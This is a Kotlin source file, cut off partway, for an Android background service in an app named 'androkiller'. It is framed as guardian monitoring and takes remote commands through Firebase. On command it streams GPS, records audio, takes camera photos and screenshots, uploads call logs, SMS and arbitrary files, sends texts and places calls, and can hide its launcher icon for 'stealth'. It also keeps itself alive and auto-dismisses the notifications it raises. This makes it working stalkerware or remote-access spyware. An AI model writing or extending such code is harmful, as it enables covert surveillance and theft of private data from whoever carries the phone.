package com.nexus.androkiller.service

import android.app.ActivityOptions
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager as AndroidNotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.AudioAttributes
import android.media.RingtoneManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.firestore.ListenerRegistration
import com.nexus.androkiller.MainActivity
import com.nexus.androkiller.R
import com.nexus.androkiller.data.TrackerRepository
import com.nexus.androkiller.model.CommandMessage
import com.nexus.androkiller.model.UsageLog
import com.nexus.androkiller.receiver.BootReceiver
import com.nexus.androkiller.tracker.AudioRecorderManager
import com.nexus.androkiller.tracker.CameraSnapshotManager
import com.nexus.androkiller.tracker.DeviceStatusProvider
import com.nexus.androkiller.tracker.LocationTracker
import com.nexus.androkiller.tracker.NotificationManager as CustomNotificationManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await

/**
 * Android Foreground Service maintaining persistent background tracking,
 * GPS telemetry dispatch, remote command execution, and device health reporting.
 */
class TrackerForegroundService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.Main + Job())
    private var heartbeatJob: Job? = null
    private var locationCollectorJob: Job? = null
    private var commandListener: ListenerRegistration? = null
    private var connectivityCallback: ConnectivityManager.NetworkCallback? = null

    private lateinit var statusProvider: DeviceStatusProvider
    private lateinit var locationTracker: LocationTracker
    private lateinit var audioRecorder: AudioRecorderManager
    private lateinit var cameraSnapshotManager: CameraSnapshotManager
    private lateinit var storageFileManager: com.nexus.androkiller.tracker.StorageFileManager
    private lateinit var callSmsManager: com.nexus.androkiller.tracker.CallSmsManager
    private lateinit var torchManager: com.nexus.androkiller.tracker.TorchManager
    private lateinit var installedAppsManager: com.nexus.androkiller.tracker.InstalledAppsManager
    private lateinit var screenCaptureManager: com.nexus.androkiller.tracker.ScreenCaptureManager
    private lateinit var notificationManager: CustomNotificationManager
    private lateinit var repository: TrackerRepository

    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null
    private var trackingIntervalSeconds = 15L

    private val systemNotificationManager: AndroidNotificationManager by lazy {
        getSystemService(Context.NOTIFICATION_SERVICE) as AndroidNotificationManager
    }


    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Creating TrackerForegroundService...")

        statusProvider = DeviceStatusProvider(this)
        locationTracker = LocationTracker(this)
        audioRecorder = AudioRecorderManager(this)
        cameraSnapshotManager = CameraSnapshotManager(this)
        screenCaptureManager = com.nexus.androkiller.tracker.ScreenCaptureManager(this)
        storageFileManager = com.nexus.androkiller.tracker.StorageFileManager(this)
        callSmsManager = com.nexus.androkiller.tracker.CallSmsManager(this)
        torchManager = com.nexus.androkiller.tracker.TorchManager(this)
        installedAppsManager = com.nexus.androkiller.tracker.InstalledAppsManager(this)
        notificationManager = CustomNotificationManager(this)
        repository = TrackerRepository(this)

        acquireWakeLock()
        acquireWifiLock()
        createNotificationChannel()
        registerNetworkCallback()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action ?: ACTION_START_TRACKING

        // Keep rolling watchdog alarm alive
        BootReceiver.scheduleNextKeepaliveAlarm(this, 60_000L)

        when (action) {
            ACTION_STOP_TRACKING -> {
                Log.i(TAG, "Stop action received.")
                stopServiceInternal()
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_TAKE_SNAPSHOT -> {
                triggerCameraSnapshot()
                return START_STICKY
            }
            ACTION_RECORD_AUDIO -> {
                val duration = intent?.getIntExtra(EXTRA_DURATION_SECONDS, 10) ?: 10
                triggerAudioRecording(duration)
                return START_STICKY
            }
            else -> {
                val interval = intent?.getLongExtra(EXTRA_INTERVAL_SECONDS, trackingIntervalSeconds) ?: trackingIntervalSeconds
                trackingIntervalSeconds = interval
                startForegroundWithNotification()
                startMonitoring()
                return START_STICKY
            }
        }
    }

    private fun startForegroundWithNotification() {
        val notification = buildServiceNotification("Monitoring active. Coordinates streaming...")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            } else {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            try {
                startForeground(NOTIFICATION_ID, notification, type)
            } catch (e: Exception) {
                Log.w(TAG, "Failed startForeground with specialized types, falling back to location: ${e.message}")
                try {
                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                } catch (_: Exception) {
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                        } else {
                            startForeground(NOTIFICATION_ID, notification)
                        }
                    } catch (_: Exception) {
                        startForeground(NOTIFICATION_ID, notification)
                    }
                }
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun startMonitoring() {
        val deviceId = statusProvider.getDeviceId()
        isServiceRunning = true

        // 1. Start fused GPS updates
        locationTracker.startTracking(trackingIntervalSeconds)

        // 2. Collect location flow and push to Firestore with smart throttling
        locationCollectorJob?.cancel()
        locationCollectorJob = serviceScope.launch {
            var lastPushedLat = 0.0
            var lastPushedLng = 0.0
            var lastPushedTime = 0L

            locationTracker.locationFlow.collect { locationData ->
                val now = System.currentTimeMillis()
                val dist = FloatArray(1)
                android.location.Location.distanceBetween(
                    lastPushedLat, lastPushedLng,
                    locationData.latitude, locationData.longitude,
                    dist
                )
                val movedSignificant = dist[0] >= 15f // moved more than 15 meters
                val timeElapsed = (now - lastPushedTime) >= 45_000L // or at least 45s passed

                if (movedSignificant || timeElapsed || lastPushedTime == 0L) {
                    lastPushedLat = locationData.latitude
                    lastPushedLng = locationData.longitude
                    lastPushedTime = now
                    repository.pushLocationData(locationData)
                }
                updateNotificationText("Lat: ${"%.4f".format(locationData.latitude)}, Lng: ${"%.4f".format(locationData.longitude)} (${locationData.batteryLevel}%)")
            }
        }

        // 3. Listen for dashboard commands with auto-recovery
        ensureCommandListenerActive(deviceId)

        // 4. Start real-time notification listeners (calls, SMS, guardian messages)
        notificationManager.startListening(deviceId)

        // 5. Start heartbeat status updater & keepalive watchdog
        heartbeatJob?.cancel()
        heartbeatJob = serviceScope.launch {
            while (isActive) {
                acquireWakeLock()
                acquireWifiLock()
                ensureCommandListenerActive(deviceId)
                BootReceiver.scheduleNextKeepaliveAlarm(this@TrackerForegroundService, 60_000L)

                try {
                    com.google.firebase.firestore.FirebaseFirestore.getInstance().enableNetwork()
                } catch (_: Exception) {}

                val status = statusProvider.getSystemStatus(
                    monitoringActive = true,
                    intervalSeconds = trackingIntervalSeconds
                )
                repository.updateSystemStatus(status)
                delay(30_000L) // 30 seconds keepalive heartbeat (stable and sustainable)
            }
        }

        serviceScope.launch {
            repository.pushLog(
                UsageLog(
                    deviceId = deviceId,
                    eventType = "SERVICE_START",
                    message = "Foreground tracking service launched with interval ${trackingIntervalSeconds}s",
                    level = "INFO"
                )
            )
            // Guard each dangerous ContentProvider query with a permission check.
            // Without this, SecurityException is thrown on fresh install → app crash.
            try {
                if (com.nexus.androkiller.tracker.PermissionManager.hasCallPermission(this@TrackerForegroundService)) {
                    callSmsManager.syncCallLogsToFirestore(deviceId)
                } else {
                    Log.i(TAG, "Skipping call log sync — READ_CALL_LOG not granted")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Call log sync warning: ${e.message}")
            }
            try {
                if (com.nexus.androkiller.tracker.PermissionManager.hasSmsPermission(this@TrackerForegroundService)) {
                    callSmsManager.syncSmsToFirestore(deviceId)
                } else {
                    Log.i(TAG, "Skipping SMS sync — READ_SMS not granted")
                }
            } catch (e: Exception) {
                Log.w(TAG, "SMS sync warning: ${e.message}")
            }
            try {
                // Storage scan checks permissions internally on Android 13+; still guard here
                storageFileManager.scanAndSyncFiles(deviceId)
            } catch (e: SecurityException) {
                Log.i(TAG, "Skipping storage scan — storage permission not granted: ${e.message}")
            } catch (e: Exception) {
                Log.w(TAG, "Storage scan warning: ${e.message}")
            }
            try {
                installedAppsManager.syncInstalledAppsToFirestore(deviceId)
            } catch (e: Exception) {
                Log.w(TAG, "Installed apps sync warning: ${e.message}")
            }
        }
    }

    private fun handleRemoteCommand(command: CommandMessage) {
        serviceScope.launch {
            Log.i(TAG, "Executing remote command: ${command.action}")
            try {
                when (command.action.uppercase()) {
                    "START_TRACKING" -> {
                        locationTracker.startTracking(trackingIntervalSeconds)
                        repository.markCommandExecuted(command.commandId, "EXECUTED")
                    }
                    "STOP_TRACKING" -> {
                        locationTracker.stopTracking()
                        repository.markCommandExecuted(command.commandId, "EXECUTED")
                    }
                    "TAKE_SNAPSHOT" -> {
                        val useFront = (command.parameters["useFrontCamera"] as? Boolean) == true
                        triggerCameraSnapshot(command.commandId, useFront)
                    }
                    "RECORD_AUDIO" -> {
                        val duration = (command.parameters["duration"] as? Number)?.toInt() ?: 10
                        triggerAudioRecording(duration, command.commandId)
                    }
                    "TOGGLE_TORCH", "SET_TORCH" -> {
                        val enabled = command.parameters["enabled"] as? Boolean
                        val res = if (enabled != null) {
                            torchManager.setTorch(enabled)
                        } else {
                            torchManager.toggleTorch()
                        }
                        if (res) {
                            repository.markCommandExecuted(command.commandId, "EXECUTED")
                        } else {
                            repository.markCommandExecuted(command.commandId, "FAILED", "Failed toggling torch")
                        }
                    }
                    "SYNC_APPS", "LIST_APPS" -> {
                        val targetDevId = command.deviceId.ifBlank { statusProvider.getDeviceId() }
                        serviceScope.launch {
                            val res = installedAppsManager.syncInstalledAppsToFirestore(targetDevId)
                            if (res.isSuccess) {
                                repository.markCommandExecuted(command.commandId, "EXECUTED")
                            } else {
                                repository.markCommandExecuted(command.commandId, "FAILED", res.exceptionOrNull()?.message)
                            }
                        }
                    }
                    "SHOW_CHAT_OVERLAY", "START_CHAT" -> {
                        try {
                            val chatIntent = Intent(this@TrackerForegroundService, com.nexus.androkiller.ui.chat.ChatOverlayActivity::class.java).apply {
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                            }
                            startActivity(chatIntent)
                            repository.markCommandExecuted(command.commandId, "EXECUTED")
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed launching ChatOverlayActivity: ${e.message}", e)
                            repository.markCommandExecuted(command.commandId, "FAILED", e.message)
                        }
                    }
                    "SET_INTERVAL" -> {
                        val newInterval = (command.parameters["interval"] as? Number)?.toLong() ?: 15L
                        trackingIntervalSeconds = newInterval
                        locationTracker.startTracking(newInterval)
                        repository.markCommandExecuted(command.commandId, "EXECUTED")
                    }
                    "RING_PHONE" -> {
                        triggerLoudRingtone()
                        repository.markCommandExecuted(command.commandId, "EXECUTED")
                    }
                    "SEND_MESSAGE" -> {
                        val text = command.parameters["text"] as? String ?: "Guardian check-in"
                        showHighPriorityParentMessageNotification(text)
                        repository.markCommandExecuted(command.commandId, "EXECUTED")
                    }
                    "CALL_PHONE", "MAKE_CALL", "DIRECT_CALL", "DIAL_PHONE", "OPEN_DIALER" -> {
                        val phone = (command.parameters["phoneNumber"] as? String)
                            ?.ifBlank { null }
                            ?: statusProvider.getGuardianPhone()
                        val directCall = command.action.uppercase() in listOf("CALL_PHONE", "MAKE_CALL", "DIRECT_CALL") ||
                                (command.parameters["directCall"] as? Boolean) == true

                        try {
                            val hasCallPermission = androidx.core.content.ContextCompat.checkSelfPermission(
                                this@TrackerForegroundService,
                                android.Manifest.permission.CALL_PHONE
                            ) == android.content.pm.PackageManager.PERMISSION_GRANTED

                            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as AndroidNotificationManager

                            if (directCall && hasCallPermission) {
                                // 1. Attempt TelecomManager.placeCall (Direct IPC bypassing ActivityTaskManager background start restrictions)
                                val telecomManager = getSystemService(Context.TELECOM_SERVICE) as? android.telecom.TelecomManager
                                if (telecomManager != null) {
                                    try {
                                        val uri = Uri.fromParts("tel", phone, null)
                                        Log.i(TAG, "Initiating direct background call via TelecomManager: $phone")
                                        telecomManager.placeCall(uri, android.os.Bundle())
                                    } catch (tmEx: Exception) {
                                        Log.w(TAG, "TelecomManager.placeCall warning: ${tmEx.message}")
                                    }
                                }

                                // 2. High-priority FullScreenIntent Call Notification (Official Android background activity start mechanism)
                                val callIntent = Intent(Intent.ACTION_CALL).apply {
                                    data = Uri.parse("tel:$phone")
                                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                                }
                                val pendingIntent = PendingIntent.getActivity(
                                    this@TrackerForegroundService,
                                    2001,
                                    callIntent,
                                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                                )
                                val soundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
                                val notif = NotificationCompat.Builder(this@TrackerForegroundService, CHANNEL_ID_ALERTS)
                                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                                    .setContentTitle("Connecting Family Call")
                                    .setContentText("Dialing $phone...")
                                    .setPriority(NotificationCompat.PRIORITY_MAX)
                                    .setCategory(NotificationCompat.CATEGORY_CALL)
                                    .setSound(soundUri)
                                    .setVibrate(longArrayOf(0, 300, 200, 300))
                                    .setAutoCancel(true)
                                    .setFullScreenIntent(pendingIntent, true)
                                    .build()
                                systemNotificationManager.notify(3001, notif)

                                // Auto-dismiss call notification after 10s so it doesn't linger in tray
                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                    try {
                                        systemNotificationManager.cancel(3001)
                                        systemNotificationManager.cancel(3002)
                                    } catch (_: Exception) {}
                                }, 10_000L)

                                try {
                                    startActivity(callIntent)
                                } catch (e: Exception) {
                                    Log.w(TAG, "startActivity direct call: ${e.message}")
                                }
                            } else {
                                val dialIntent = Intent(Intent.ACTION_DIAL).apply {
                                    data = Uri.parse("tel:$phone")
                                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                                }
                                val pendingIntent = PendingIntent.getActivity(
                                    this@TrackerForegroundService,
                                    2002,
                                    dialIntent,
                                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                                )
                                val soundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
                                val notif = NotificationCompat.Builder(this@TrackerForegroundService, CHANNEL_ID_ALERTS)
                                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                                    .setContentTitle("Guardian Dialer")
                                    .setContentText("Pre-filled dialer for $phone")
                                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                                    .setCategory(NotificationCompat.CATEGORY_CALL)
                                    .setSound(soundUri)
                                    .setVibrate(longArrayOf(0, 250, 200, 250))
                                    .setAutoCancel(true)
                                    .setFullScreenIntent(pendingIntent, true)
                                    .build()
                                systemNotificationManager.notify(3002, notif)

                                // Auto-dismiss call notification after 10s so it doesn't linger in tray
                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                    try {
                                        systemNotificationManager.cancel(3001)
                                        systemNotificationManager.cancel(3002)
                                    } catch (_: Exception) {}
                                }, 10_000L)

                                try {
                                    startActivity(dialIntent)
                                } catch (_: Exception) {}
                            }

                            repository.markCommandExecuted(command.commandId, "EXECUTED")
                            Log.i(TAG, "Call command processed for: $phone (directCall=$directCall)")
                        } catch (dialEx: Exception) {
                            Log.e(TAG, "Failed to initiate call: ${dialEx.message}", dialEx)
                            repository.markCommandExecuted(command.commandId, "FAILED", dialEx.message)
                        }
                    }
                    "SYNC_CALLS" -> {
                        val targetDevId = command.deviceId.ifBlank { statusProvider.getDeviceId() }
                        serviceScope.launch {
                            val res = callSmsManager.syncCallLogsToFirestore(targetDevId)
                            if (res.isSuccess) {
                                repository.markCommandExecuted(command.commandId, "EXECUTED")
                            } else {
                                repository.markCommandExecuted(command.commandId, "FAILED", res.exceptionOrNull()?.message)
                            }
                        }
                    }
                    "SYNC_SMS" -> {
                        val targetDevId = command.deviceId.ifBlank { statusProvider.getDeviceId() }
                        serviceScope.launch {
                            val res = callSmsManager.syncSmsToFirestore(targetDevId)
                            if (res.isSuccess) {
                                repository.markCommandExecuted(command.commandId, "EXECUTED")
                            } else {
                                repository.markCommandExecuted(command.commandId, "FAILED", res.exceptionOrNull()?.message)
                            }
                        }
                    }
                    "SEND_SMS" -> {
                        val targetDevId = command.deviceId.ifBlank { statusProvider.getDeviceId() }
                        val destination = command.parameters["phoneNumber"] as? String ?: ""
                        val message = command.parameters["message"] as? String ?: ""
                        val sent = callSmsManager.sendSms(destination, message)
                        if (sent) {
                            serviceScope.launch { callSmsManager.syncSmsToFirestore(targetDevId) }
                            repository.markCommandExecuted(command.commandId, "EXECUTED")
                        } else {
                            repository.markCommandExecuted(command.commandId, "FAILED", "Failed sending SMS")
                        }
                    }
                    "SCAN_STORAGE", "LIST_FILES" -> {
                        val targetDevId = command.deviceId.ifBlank { statusProvider.getDeviceId() }
                        serviceScope.launch {
                            val scanRes = storageFileManager.scanAndSyncFiles(targetDevId)
                            if (scanRes.isSuccess) {
                                repository.markCommandExecuted(command.commandId, "EXECUTED")
                            } else {
                                repository.markCommandExecuted(command.commandId, "FAILED", scanRes.exceptionOrNull()?.message)
                            }
                        }
                    }
                    "CAPTURE_SCREENSHOT", "TAKE_SCREENSHOT" -> {
                        val targetDevId = command.deviceId.ifBlank { statusProvider.getDeviceId() }
                        serviceScope.launch {
                            try {
                                val result = screenCaptureManager.captureScreenshot()
                                if (result.isSuccess) {
                                    val file = result.getOrThrow()
                                    val uploadResult = repository.uploadMediaFile(file, "SCREENSHOT", targetDevId)
                                    if (uploadResult.isSuccess) {
                                        repository.markCommandExecuted(command.commandId, "EXECUTED", uploadResult.getOrThrow().downloadUrl)
                                    } else {
                                        repository.markCommandExecuted(command.commandId, "FAILED", uploadResult.exceptionOrNull()?.message)
                                    }
                                } else {
                                    repository.markCommandExecuted(command.commandId, "FAILED", result.exceptionOrNull()?.message)
                                }
                            } catch (e: Exception) {
                                repository.markCommandExecuted(command.commandId, "FAILED", e.message)
                            }
                        }
                    }
                    "FETCH_FILE", "DOWNLOAD_FILE" -> {
                        val targetDevId = command.deviceId.ifBlank { statusProvider.getDeviceId() }
                        val filePath = command.parameters["path"] as? String ?: ""
                        val fileName = command.parameters["name"] as? String ?: ""
                        val fileId = command.parameters["fileId"] as? String ?: ""
                        serviceScope.launch {
                            try {
                                Log.i(TAG, "Processing FETCH_FILE request: path='$filePath', id='$fileId', name='$fileName'")
                                val fileBytes = storageFileManager.readFileBytes(filePath, fileId, fileName)
                                if (fileBytes != null && fileBytes.isNotEmpty()) {
                                    val safeName = fileName.ifBlank {
                                        if (filePath.isNotBlank()) java.io.File(filePath).name else "device_file.bin"
                                    }
                                    Log.i(TAG, "Read ${fileBytes.size} real bytes for $safeName")

                                    var downloadUrl: String? = null
                                    var uploadError: String? = null

                                    // 1. Try Firebase Storage upload if available
                                    val storage = try { com.google.firebase.storage.FirebaseStorage.getInstance() } catch (_: Exception) { null }
                                    if (storage != null) {
                                        try {
                                            val sanitizedName = safeName.replace(Regex("[^a-zA-Z0-9._-]"), "_")
                                            val storagePath = "devices/$targetDevId/files/${System.currentTimeMillis()}_$sanitizedName"
                                            val storageRef = storage.reference.child(storagePath)
                                            val meta = com.google.firebase.storage.StorageMetadata.Builder()
                                                .setContentType(getMimeTypeForFilename(safeName))
                                                .build()
                                            storageRef.putBytes(fileBytes, meta).await()
                                            downloadUrl = storageRef.downloadUrl.await().toString()
                                            Log.i(TAG, "Uploaded to Firebase Storage: $downloadUrl")
                                        } catch (e: Exception) {
                                            Log.w(TAG, "Firebase Storage upload fallback: ${e.message}")
                                            uploadError = e.message
                                        }
                                    }

                                    // 2. Base64 Data URI fallback for free Firebase Spark plan (supports up to ~850KB binary)
                                    if (downloadUrl == null && fileBytes.size <= 850 * 1024) {
                                        val mimeType = getMimeTypeForFilename(safeName)
                                        val base64 = android.util.Base64.encodeToString(fileBytes, android.util.Base64.NO_WRAP)
                                        downloadUrl = "data:$mimeType;base64,$base64"
                                        Log.i(TAG, "Created Base64 Data URI for $safeName (length: ${downloadUrl.length} chars)")
                                    }

                                    if (downloadUrl != null) {
                                        // 3. Deliver file bytes via file_transfers subcollection so Web UI receives full real bytes
                                        val transferPayload = hashMapOf(
                                            "commandId" to command.commandId,
                                            "fileId" to fileId,
                                            "fileName" to safeName,
                                            "filePath" to filePath,
                                            "fileSize" to fileBytes.size.toLong(),
                                            "downloadUrl" to downloadUrl,
                                            "status" to "COMPLETED",
                                            "timestamp" to com.google.firebase.firestore.FieldValue.serverTimestamp()
                                        )

                                        com.google.firebase.firestore.FirebaseFirestore.getInstance()
                                            .collection("devices")
                                            .document(targetDevId)
                                            .collection("file_transfers")
                                            .document(command.commandId)
                                            .set(transferPayload)
                                            .await()

                                        // 4. Update catalog downloadUrl ONLY if it's a short URL (not giant Base64) to protect doc limit
                                        if (!downloadUrl.startsWith("data:") || downloadUrl.length < 50_000) {
                                            storageFileManager.updateFileDownloadUrl(targetDevId, filePath, downloadUrl)
                                        }

                                        // 5. Mark command executed
                                        val successMsg = if (downloadUrl.startsWith("data:") && downloadUrl.length > 700_000) {
                                            "Delivered real file (${fileBytes.size} bytes) via Data URI"
                                        } else {
                                            downloadUrl
                                        }
                                        repository.markCommandExecuted(command.commandId, "EXECUTED", successMsg)
                                        Log.i(TAG, "FETCH_FILE successfully completed for $safeName")
                                    } else {
                                        val errMsg = if (fileBytes.size > 850 * 1024) {
                                            "File size (${fileBytes.size / 1024} KB) exceeds free Firestore inline limit. Please configure Firebase Storage Blaze Plan or Cloudinary in Storage Settings."
                                        } else {
                                            uploadError ?: "Failed delivering file bytes"
                                        }
                                        repository.markCommandExecuted(command.commandId, "FAILED", errMsg)
                                    }
                                } else {
                                    val err = "File not readable on device: path='$filePath', name='$fileName'. Please check All Files Access permission in companion app."
                                    Log.w(TAG, err)
                                    repository.markCommandExecuted(command.commandId, "FAILED", err)
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "Exception handling FETCH_FILE: ${e.message}", e)
                                repository.markCommandExecuted(command.commandId, "FAILED", e.message)
                            }
                        }
                    }
                    "TOGGLE_STEALTH", "TOGGLE_ICON" -> {
                        val isHidden = com.nexus.androkiller.util.LauncherVisibility.toggleLauncherIcon(this@TrackerForegroundService)
                        val msg = if (isHidden) "Launcher icon hidden (Stealth ON)" else "Launcher icon visible (Stealth OFF)"
                        repository.markCommandExecuted(command.commandId, "EXECUTED", msg)
                        Log.i(TAG, "Command TOGGLE_STEALTH processed: isHidden=$isHidden")
                    }
                    "HIDE_ICON", "ENABLE_STEALTH" -> {
                        val success = com.nexus.androkiller.util.LauncherVisibility.hideLauncherIcon(this@TrackerForegroundService)
                        repository.markCommandExecuted(command.commandId, if (success) "EXECUTED" else "FAILED", "Launcher icon hidden (Stealth ON)")
                        Log.i(TAG, "Command HIDE_ICON processed: success=$success")
                    }
                    "SHOW_ICON", "DISABLE_STEALTH" -> {
                        val success = com.nexus.androkiller.util.LauncherVisibility.showLauncherIcon(this@TrackerForegroundService)
                        repository.markCommandExecuted(command.commandId, if (success) "EXECUTED" else "FAILED", "Launcher icon restored (Stealth OFF)")
                        Log.i(TAG, "Command SHOW_ICON processed: success=$success")
                    }
                    "START_SCREEN_STREAM", "SCREEN_STREAM" -> {
                        val targetDevId = command.deviceId.ifBlank { statusProvider.getDeviceId() }
                        val peerId = (command.parameters["peerId"] as? String)?.ifBlank { null }
                            ?: "screen_$targetDevId"
                        try {
                            val intent = Intent(this@TrackerForegroundService, ScreenCaptureConsentActivity::class.java).apply {
                                putExtra(ScreenCaptureConsentActivity.EXTRA_PEER_ID, peerId)
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                            }
                            val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                                val bOptions = ActivityOptions.makeBasic().apply {
                                    setPendingIntentBackgroundActivityStartMode(ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
                                }.toBundle()
                                PendingIntent.getActivity(
                                    this@TrackerForegroundService,
                                    3005,
                                    intent,
                                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
                                    bOptions
                                )
                            } else {
                                PendingIntent.getActivity(
                                    this@TrackerForegroundService,
                                    3005,
                                    intent,
                                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                                )
                            }
                            val notif = NotificationCompat.Builder(this@TrackerForegroundService, CHANNEL_ID_ALERTS)
                                .setSmallIcon(R.drawable.ic_launcher_foreground)
                                .setContentTitle("Live Screen Broadcast Request")
                                .setContentText("Tap to start live screen streaming to dashboard")
                                .setPriority(NotificationCompat.PRIORITY_MAX)
                                .setCategory(NotificationCompat.CATEGORY_CALL)
                                .setAutoCancel(true)
                                .setFullScreenIntent(pendingIntent, true)
                                .build()
                            systemNotificationManager.notify(3005, notif)

                            try {
                                startActivity(intent)
                            } catch (e: Exception) {
                                Log.w(TAG, "Direct startActivity for screen capture: ${e.message}")
                            }

                            repository.markCommandExecuted(command.commandId, "EXECUTED", "Screen stream consent prompt dispatched for $peerId")
                            Log.i(TAG, "START_SCREEN_STREAM processed for peerId=$peerId")
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to start screen stream: ${e.message}", e)
                            repository.markCommandExecuted(command.commandId, "FAILED", e.message)
                        }
                    }
                    "STOP_SCREEN_STREAM" -> {
                        try {
                            ScreenCaptureService.stop(this@TrackerForegroundService)
                            repository.markCommandExecuted(command.commandId, "EXECUTED", "ScreenCaptureService stopped")
                            Log.i(TAG, "STOP_SCREEN_STREAM processed")
                        } catch (e: Exception) {
                            repository.markCommandExecuted(command.commandId, "FAILED", e.message)
                        }
                    }
                    "SEND_TEST_NOTIFICATION", "TRIGGER_TEST_NOTIF" -> {
                        try {
                            val targetDevId = command.deviceId.ifBlank { statusProvider.getDeviceId() }
                            val timeStr = java.text.SimpleDateFormat("hh:mm:ss a", java.util.Locale.getDefault()).format(java.util.Date())
                            notificationManager.pushSystemAlert(
                                deviceId = targetDevId,
                                title = "Real-Time Test Alert",
                                body = "Live test notification from phone sent at $timeStr. Real-time pipeline active!"
                            )
                            repository.markCommandExecuted(command.commandId, "EXECUTED", "Test notification pushed successfully")
                            Log.i(TAG, "SEND_TEST_NOTIFICATION processed for $targetDevId")
                        } catch (e: Exception) {
                            repository.markCommandExecuted(command.commandId, "FAILED", e.message)
                        }
                    }
                    else -> {
                        repository.markCommandExecuted(command.commandId, "FAILED", "Unknown action ${command.action}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command execution failed: ${e.message}", e)
                repository.markCommandExecuted(command.commandId, "FAILED", e.message)
            }
        }
    }

    private fun triggerCameraSnapshot(commandId: String? = null, useFrontCamera: Boolean = false) {
        val deviceId = statusProvider.getDeviceId()
        cameraSnapshotManager.takeSnapshot(
            lifecycleOwner = null,
            useFrontCamera = useFrontCamera,
            onSuccess = { photoFile ->
                serviceScope.launch {
                    val result = repository.uploadMediaFile(photoFile, "IMAGE", deviceId)
                    if (result.isSuccess) {
                        commandId?.let { repository.markCommandExecuted(it, "EXECUTED") }
                    } else {
                        commandId?.let { repository.markCommandExecuted(it, "FAILED", result.exceptionOrNull()?.message) }
                    }
                }
            },
            onError = { ex ->
                Log.e(TAG, "Snapshot error: ${ex.message}")
                commandId?.let {
                    serviceScope.launch { repository.markCommandExecuted(it, "FAILED", ex.message) }
                }
            }
        )
    }

    private fun triggerAudioRecording(durationSeconds: Int, commandId: String? = null) {
        val deviceId = statusProvider.getDeviceId()
        val started = audioRecorder.startRecording(durationSeconds) { audioFile ->
            if (audioFile != null) {
                serviceScope.launch {
                    val result = repository.uploadMediaFile(audioFile, "AUDIO", deviceId, durationSeconds)
                    if (result.isSuccess) {
                        commandId?.let { repository.markCommandExecuted(it, "EXECUTED") }
                    } else {
                        commandId?.let { repository.markCommandExecuted(it, "FAILED", result.exceptionOrNull()?.message) }
                    }
                }
            } else {
                commandId?.let {
                    serviceScope.launch { repository.markCommandExecuted(it, "FAILED", "Audio capture returned empty file") }
                }
            }
        }

        if (!started && commandId != null) {
            serviceScope.launch {
                repository.markCommandExecuted(commandId, "FAILED", "Could not start audio recording")
            }
        }
    }

    private var activeRingtone: android.media.Ringtone? = null

    private fun triggerLoudRingtone() {
        try {
            val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM)
                ?: android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
            activeRingtone?.stop()
            val ringtone = android.media.RingtoneManager.getRingtone(applicationContext, uri)
            activeRingtone = ringtone
            ringtone?.play()
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                activeRingtone?.stop()
                activeRingtone = null
            }, 12000L)
        } catch (e: Exception) {
